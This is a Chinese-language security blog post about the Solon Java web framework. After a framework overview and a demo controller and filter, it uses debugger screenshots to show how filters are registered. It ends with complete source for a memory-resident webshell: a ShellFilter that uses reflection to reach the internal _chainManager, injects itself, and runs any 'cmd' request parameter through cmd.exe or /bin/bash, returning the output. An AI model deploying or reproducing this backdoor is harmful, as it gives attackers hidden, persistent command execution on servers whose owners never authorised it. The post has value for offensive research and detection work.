## Solon 介绍

[Solon（OpenSolon） | 官网 （Spring 替代方案） (noear.org)](https://solon.noear.org/)

[GitHub - opensolon/solon: 🔥 A Scene-oriented Java Application Development Framework: Restrained, Efficient, Open, Ecological!!! 300% higher concurrency 50% memory savings Startup is 10 times faster. Packing 90% smaller; Compatible with java8 ~ java23. (Replaceable spring)](https://github.com/opensolon/solon)
面向全场景的 Java “生态型”应用开发框架。从零开始构建，有自主的标准规范与开放生态。目前已近15万行代码。
### 技术介绍：

内核零依赖；组合不同的插件应对不同需求；方便定制；快速开发。

- Http、WebSocket、Socket 三种信号统一的开发体验（俗称：三源合一）
- 支持“注解”与“手动”两种模式并重，按需自由操控
- Not Servlet，可以适配任何 Http 通讯框架（所以：最小 0.3m 运行rpc架构）
- 独特的 IOC/AOP 容器设计。不会因为依赖变多而启动很慢
- 适合 Web、Scheduling、FaaS、Remoting、Cloud 等任何开发场景
- 强调插件式扩展，可扩展可切换；适应不同的应用场景
- 支持 GraalVm Native Image 打包
- 允许业务插件“热插”、“热拔”、“热管理”

## 测试环境搭建
官网提供的简单demo
```JAVA
package com.example.demo;  
  
import org.noear.solon.annotation.Controller;  
import org.noear.solon.annotation.Mapping;  
import org.noear.solon.annotation.Param;  
import org.noear.solon.core.handle.ModelAndView;  
  
@Controller  
public class DemoController {  
    @Mapping("/hello")  
    public String hello(@Param(defaultValue = "world") String name) {  
        return String.format("Hello %s!", name);  
    }  
      
    @Mapping("/hello2")  
    public ModelAndView hello2(@Param(defaultValue = "world") String name) {  
        return new ModelAndView("hello2.ftl").put("name", name);  
    }  
}
```

TestFilter

```JAVA
package com.example.demo;  
  
import org.noear.solon.annotation.Component;  
import org.noear.solon.core.handle.Context;  
import org.noear.solon.core.handle.Filter;  
import org.noear.solon.core.handle.FilterChain;  
  
@Component  
public class TestFilter implements Filter {  
    @Override  
    public void doFilter(Context ctx, FilterChain chain) throws Throwable {  
        System.out.println("[doing] TestFilter::doFilter");  
        chain.doFilter(ctx);  
    }  
}
```

## 利用原理
通过在路由hello处下断点，最早对doFilter的调用

![](attachments/Pasted%20image%2020241205214416.png)

简单阅读代码可以看到在ChainManager，有方法addFilter

![](attachments/Pasted%20image%2020241205214846.png)


过滤器添加断点获取到了org/noear/solon/core/route/RouterWrapper.java处进行了ChainManger的初始化，以及对addFilter的调用。

![](attachments/Pasted%20image%2020241205220627.png)

因此编写solon的内存马主要就是找到内存变量_chainManger，并调用它的doFilter加载恶意Filter

## 内存马编写

```JAVA
package com.example.demo;  
import org.noear.solon.annotation.Component;  
import org.noear.solon.core.ChainManager;  
import org.noear.solon.core.handle.Context;  
import org.noear.solon.core.handle.Filter;  
import org.noear.solon.core.handle.FilterChain;  
import java.lang.reflect.Field;  
@Component  
public class ShellFilter implements Filter {  
    static {  
        try {  
            Context ctx = Context.current();  
            Object obj = ctx.request();  
            Field field = obj.getClass().getSuperclass().getDeclaredField("request");  
            field.setAccessible(true);  
            obj = field.get(obj);  
            field = obj.getClass().getDeclaredField("serverHandler");  
            field.setAccessible(true);  
            obj = field.get(obj);  
            field = obj.getClass().getDeclaredField("handler");  
            field.setAccessible(true);  
            obj = field.get(obj);  
            field = obj.getClass().getDeclaredField("arg$1");  
            field.setAccessible(true);  
            obj = field.get(obj);  
            field = obj.getClass().getSuperclass().getDeclaredField("_chainManager");  
            field.setAccessible(true);  
            obj = field.get(obj);  
            ChainManager chainManager = (ChainManager) obj;  
            chainManager.addFilter(new ShellFilter(), 0);  
        }catch (Exception e){  
            e.printStackTrace();  
        }  
    }  
    @Override  
    public void doFilter(Context ctx, FilterChain chain) throws Throwable {  
        try{  
            if(ctx.param("cmd")!=null){  
                String str = ctx.param("cmd");  
                try{  
                    String[] cmds =  
                            System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",  
                                    "/c", str} : new String[]{"/bin/bash", "-c", str};  
                    String output = (new java.util.Scanner((new  
                            ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();  
                    ctx.output(output);  
                }catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
        }catch (Throwable e){  
            System.out.println("异常："+e.getMessage()) ;  
        }  
        chain.doFilter(ctx);  
    }  
}
```